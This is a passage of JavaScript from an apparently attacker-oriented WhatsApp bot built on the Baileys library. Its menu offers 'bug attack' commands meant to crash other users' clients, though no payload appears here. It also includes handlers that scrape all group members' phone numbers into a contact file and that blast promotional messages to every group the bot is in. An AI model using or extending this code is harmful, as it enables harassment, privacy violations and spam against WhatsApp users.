│ ⑄ ᴅᴇᴍᴏᴛᴇ <ᴛᴀɢ>
┗─────────────❐`
let sections = [{
title: '⿻  ⌜ LIST MENU ⌟  ⿻',
highlight_label: '𝐀𝐥𝐥 𝐌𝐞𝐧𝐮',
rows: [{
title: '𝗔𝗟𝗟 𝗠𝗘𝗡𝗨',
id: '.allmenu'
}]
},
{
title: '𝐁𝐔𝐆 𝐌𝐄𝐍𝐔 [𝗔𝗟𝗣𝗛𝗔 𝗕𝗨𝗚𝗦🥶]',
highlight_label: '𝐁𝐮𝐠 𝐌𝐞𝐧𝐮',
rows: [{
title: '𝗕𝗨𝗚 𝗠𝗘𝗡𝗨', 
id: '.bugmenu'
}]
},
{
highlight_label: '𝗕𝗨𝗧𝗧𝗢𝗡',
rows: [{
title: '𝗕𝗨𝗧𝗧𝗢𝗡 𝗕𝗨𝗚𝗦', 
id: '.buttonbug'
}]
}]
let listMessage = {
    title: '𝗠𝗘𝗡𝗨͖', 
    sections
};

let freesex = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: allmenu
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: ''
}), 
header: proto.Message.InteractiveMessage.Header.create({ 
hasMediaAttachment: true, ...(await prepareWAMessageMedia({ image: await fs.readFileSync("./database/image/blue.jpg")}, { upload: byxx.waUploadToServer })) 
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "single_select",
"buttonParamsJson": JSON.stringify(listMessage) 
},
  {
 "name": "cta_url",
 "buttonParamsJson": "{\"display_text\":\"𝗕𝗟𝗨𝗘 𝗗𝗘𝗠𝗢𝗡\",\"url\":\"https://wa.me/2347041039367\",\"merchant_url\":\"https://wa.me/2347041039367\"}"
}]
}) 
})} 
}}, {userJid: m.sender, quoted: m}) 
await byxx.relayMessage(freesex.key.remoteJid, freesex.message, { 
messageId: freesex.key.id 
})
}
break

case 'buttonbug': {
const version = require("baileys/package.json").version
const toolsmenu = `┏─── ｢ \`𝙱𝙻𝚄𝙴 𝙳𝙴𝙼𝙾𝙽͖\` ｣ ──❐
┃✾ᐉ 𝐍𝐚𝐦𝐞 : *${pushname}*
┃✾ᐉ 𝐁𝐨𝐭 : ${namabot}
┃✾ᐉ 𝐑𝐮𝐧 : *${run}*
┗──────────────❐
\`🩸⃟༑𝕴 𝕬𝕸 𝕳𝕴𝕸ཀ͜͡🦠\`

┏────────❐ 
┃ 𝗕𝗹𝘂𝗲𝗯𝘂𝘁𝘁𝗼𝗻  𝟲𝟮𝘅𝘅𝘅
┗──────────❐
𝙽𝙾𝚃𝙴 : ᴛʜɪꜱ ɪꜱ ᴀ ʙᴜɢ ʙᴜᴛᴛᴏɴ ᴄᴏᴍᴍᴀɴᴅ, ʟᴀᴛᴇʀ ʏᴏᴜ ᴡɪʟʟ ʙᴇ ᴀꜱᴋᴇᴅ ᴛᴏ ᴄʜᴏᴏꜱᴇ ᴛʜᴇ ʙᴜɢ ᴀᴛᴛᴀᴄᴋ ᴍᴇᴛʜᴏᴅ
──────────────❐`
let sections = [{
title: '⿻  ⌜ LIST MENU ⌟  ⿻',
highlight_label: '𝐀𝐥𝐥 𝐌𝐞𝐧𝐮',
rows: [{
title: '𝗔𝗟𝗟 𝗠𝗘𝗡𝗨',
id: '.allmenu'
}]
},
{
title: '𝐁𝐔𝐆 𝐌𝐄𝐍𝐔 [𝗔𝗟𝗣𝗛𝗔 𝗕𝗨𝗚𝗦🥶]',
highlight_label: '𝐁𝐮𝐠 𝐌𝐞𝐧𝐮',
rows: [{
title: '𝗕𝗨𝗚 𝗠𝗘𝗡𝗨', 
id: '.bugmenu'
}]
},
{
highlight_label: '𝗕𝗨𝗧𝗧𝗢𝗡',
rows: [{
title: '𝗕𝗨𝗧𝗧𝗢𝗡 𝗕𝗨𝗚𝗦', 
id: '.buttonbug'
}]
}]
let listMessage = {
    title: '𝗠𝗘𝗡𝗨͖', 
    sections
};

let freesex = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: toolsmenu
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: ''
}), 
header: proto.Message.InteractiveMessage.Header.create({ 
hasMediaAttachment: true, ...(await prepareWAMessageMedia({ image: await fs.readFileSync("./database/image/blue.jpg")}, { upload: byxx.waUploadToServer })) 
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "single_select",
"buttonParamsJson": JSON.stringify(listMessage) 
},
  {
 "name": "cta_url",
 "buttonParamsJson": "{\"display_text\":\"𝗕𝗟𝗨𝗘 𝗗𝗘𝗠𝗢𝗡\",\"url\":\"https://wa.me/2347041039367\",\"merchant_url\":\"https://wa.me/2347041039367\"}"
}]
}) 
})} 
}}, {userJid: m.sender, quoted: m}) 
await byxx.relayMessage(freesex.key.remoteJid, freesex.message, { 
messageId: freesex.key.id 
})
}
break
case 'svcontact': {
    if (!m.isGroup) return reply('This command can only be used in groups.');
    try {
        const groupMetadata = await byxx.groupMetadata(m.chat);
        const participants = groupMetadata.participants;

        // Create VCF file content
        let vcfContent = '';
        participants.forEach(member => {
            let phoneNumber = member.id.split('@')[0]; // Extract phone number from participant ID
            vcfContent += `BEGIN:VCARD\nVERSION:3.0\nFN:Contact ${phoneNumber}\nTEL;type=CELL:+${phoneNumber}\nEND:VCARD\n\n`;
        });

        const groupName = groupMetadata.subject || 'Group';
        const fileName = `${groupName}_contacts.vcf`;

        // Write the VCF file
        const filePath = `./${fileName}`;
        fs.writeFileSync(filePath, vcfContent);

        // Send the VCF file to the group
        await byxx.sendMessage(m.chat, {
            document: fs.readFileSync(filePath),
            fileName: fileName,
            mimetype: 'text/vcard',
            caption: `Contacts saved by ʙʟᴜᴇxᴅᴇᴍᴏɴ`
        });

        // Delete the VCF file from the server after sending
        fs.unlinkSync(filePath);
    } catch (err) {
      
    }

    break;
}
case 'ping': {
    // Capture the start time for ping calculation
    const startTime = performance.now();

    // Send a preliminary message to notify that the ping is being measured
    const pingMsg = await byxx.sendMessage(m.chat, { text: '𝐑𝐞𝐚𝐝𝐢𝐧𝐠 𝐩𝐢𝐧𝐠 ⫸' });

    // Capture the end time after the message is sent
    const endTime = performance.now();
    const latensi = (endTime - startTime).toFixed(3); // Calculate the latency in milliseconds

    // Relay an edited message with the calculated ping
    await byxx.relayMessage(m.chat, {
        protocolMessage: {
            key: pingMsg.key,
            type: 14, // Protocol type for editing messages
            editedMessage: {
                conversation: `*ᴅᴇᴍᴏɴx ᴍᴅ ꜱᴩᴇᴇᴅ ${latensi} ᴍꜱ*`
            }
        }
    }, {});
}
break;
case 'tag': case 'hidetag':
//if (!isRegistered) return registerbut(noregis)
if (!isOwner) return reply(mess.only.owner)
if (!text) return reply(`🤔`)
byxx.sendMessage(m.chat, { text : text ? text : '' , mentions: participants.map(a => a.id)}, { quoted: m })
break

case "tagall": {
if (!isOwner && !isAdmins) return reply(mess.admin)
if (!isGroup) return joreply(mess.only.group)
if (!q) return reply(`Where's the text bro?`)
let teks = `${q ? q : ''}\n‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎ \n`
for (let mem of participants) {
teks += `⊝ @${mem.id.split('@')[0]}\n`
}
HadzzModa.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: m })
}
break

case "kick": {
    if (!isGroup) return reply('This command can only be used in groups.');
    
    if (!isAdmins && !isOwner) return reply('You need to be a group admin to use this command.');
    
    if (!isBotAdmins) return reply('I need to be an admin to perform this action.');
    
    // Get the target user
    let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
    
    try {
        // Attempt to remove the user from the group
        await byxx.groupParticipantsUpdate(m.chat, [users], 'remove');
        reply('User successfully removed from the group.');
    } catch (err) {
        // Handle potential errors
        reply('Failed to remove the user: ' + err.message);
    }
}
break;

case 'closegroup': {
    if (!isGroup) return reply('This command can only be used in groups.');
    
    if (!isAdmins && !isOwner) return reply('This command is restricted to group admins.');
    
    if (!isBotAdmins) return reply('I need admin privileges to perform this action.');
    
    if (!args[0]) return reply(`*Please specify the duration:*\n- second\n- minute\n- hour\n- day\n\n*Example:*\n${prefix + command} 10 second`);
    
    let timer;
    
    switch (args[1]) {
        case 'second':
            timer = args[0] * 1000;
            break;
        case 'minute':
            timer = args[0] * 60000;
            break;
        case 'hour':
            timer = args[0] * 3600000;
            break;
        case 'day':
            timer = args[0] * 86400000;
            break;
        default:
            return reply('Invalid time unit. Please choose from: second, minute, hour, or day.');
    }

    reply('*The timer has started!*');
    
    setTimeout(() => {
        byxx.groupSettingUpdate(m.chat, 'announcement')
            .then(() => reply('Time is up! The group has been closed by the bot due to inactivity. The group will be reopened at the admin’s discretion.'))
            .catch((err) => reply(`Failed to close the group: ${err.message}`));
    }, timer);
}
break;

case 'opengroup': {
    if (!isGroup) return reply('This command can only be used in groups.');
    
    if (!isAdmins && !isOwner) return reply('This command is restricted to group admins.');
    
    if (!isBotAdmins) return reply('I need admin privileges to perform this action.');
    
    if (!args[0]) return reply(`*Please specify the duration:*\n- second\n- minute\n- hour\n- day\n\n*Example:*\n${prefix + command} 10 second`);
    
    let timer;

    switch (args[1]) {
        case 'second':
            timer = args[0] * 1000;
            break;
        case 'minute':
            timer = args[0] * 60000;
            break;
        case 'hour':
            timer = args[0] * 3600000;
            break;
        case 'day':
            timer = args[0] * 86400000;
            break;
        default:
            return reply('Invalid time unit. Please choose from: second, minute, hour, or day.');
    }

    reply('*The timer has started!*');
    
    setTimeout(() => {
        byxx.groupSettingUpdate(m.chat, 'not_announcement')
            .then(() => reply('Time is up! The group is now open, and all members can send messages.'))
            .catch((err) => reply(`Failed to open the group: ${err.message}`));
    }, timer);
}
break;

case "demote": {
    if (!isPremium) return reply('This feature is only available for premium users.');
    
    if (!isGroup) return reply('This command can only be used in groups.');
    
    if (!isAdmins && !isOwner) return reply('You need to be an admin to use this command.');
    
    if (!isBotAdmins) return reply('I need admin privileges to perform this action.');
    
    // Get the target user
    let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
    
    try {
        // Attempt to demote the user from admin role
        await byxx.groupParticipantsUpdate(m.chat, [users], 'demote');
        reply('User has been successfully demoted from admin.');
    } catch (err) {
        // Handle errors during the demotion process
        reply('Failed to demote the user: ' + err.message);
    }
}
break;

case "promote": {
    if (!isGroup) return reply('This command can only be used in groups.');
    
    if (!isAdmins && !isOwner) return reply('You need to be an admin to use this command.');
    
    if (!isBotAdmins) return reply('I need admin privileges to perform this action.');
    
    // Get the target user
    let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
    
    try {
        // Attempt to promote the user to admin
        await byxx.groupParticipantsUpdate(m.chat, [users], 'promote');
        reply('User has been successfully promoted to admin.');
    } catch (err) {
        // Handle errors during the promotion process
        reply('Failed to promote the user: ' + err.message);
    }
}
break;

case "jpmpromosi": 
case "jpmpromo": 
case "jpm3": {
    if (!isOwner) return reply(mess.only.owner);
    
    if (!text && !m.quoted) return m.reply("Please provide text or reply to a text message.");
    
    // Get the text for the promotion
    var teks = m.quoted ? m.quoted.text : text;
    let total = 0;
    
    // Fetch all groups
    let allGroups = await byxx.groupFetchAllParticipating();
    let groupEntries = Object.entries(allGroups).map(entry => entry[1]);
    
    // Filter out groups that are not closed (announcement mode off)
    let openGroups = groupEntries.filter(group => group.announce === false);
    let groupIds = openGroups.map(group => group.id);
    
    m.reply(`Processing message delivery to *${groupIds.length} groups*.`);
    
    let teksnya = teks;
    
    // Create the promotional message
    let promoMessage = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
            message: {
                "messageContextInfo": {
                    "deviceListMetadata": {},
                    "deviceListMetadataVersion": 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.create({
                    contextInfo: {
                        mentionedJid: [m.sender],
                        externalAdReply: {
                            showAdAttribution: true
                        }
                    },
                    body: proto.Message.InteractiveMessage.Body.create({
                        text: teksnya
                    }),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                        buttons: [
                            {
                                "name": "cta_url",
                                "buttonParamsJson": `{\"display_text\":\"Chat Owner\",\"url\":\"https://wa.me/2347041039367\",\"merchant_url\":\"https://whatsapp.com/channel/0029Vah3fKtCnA7oMPTPJm1h\"}`
                            },
                            {
                                "name": "cta_url",
                                "buttonParamsJson": `{\"display_text\":\"YouTube Owner\",\"url\":\"${linkyt}\",\"merchant_url\":\"https://youtube.com/@byxxxzoo\"}`
                            },
                            {
                                "name": "cta_url",
                                "buttonParamsJson": `{\"display_text\":\"Comment on bot \",\"url\":\"${isLink}\",\"merchant_url\":\"https://whatsapp.com/channel/0029Vah3fKtCnA7oMPTPJm1h\"}`
                            },
                            {
                                "name": "cta_url",
                                "buttonParamsJson": `{\"display_text\":\"Donate to BLUE🙏\",\"url\":\"https://b.top4top.io/p_3194nb6rt0.jpeg\",\"merchant_url\":\"https://b.top4top.io/p_3194nb6rt0.jpeg\"}`
                            }
                        ]
                    })
                })
            }
        }
    }, { userJid: m.sender, quoted: m });
    
    // Send the message to all groups
    for (let groupId of groupIds) {
        try {
            await byxx.relayMessage(groupId, promoMessage.message, {
                messageId: promoMessage.key.id
            });
            total += 1;
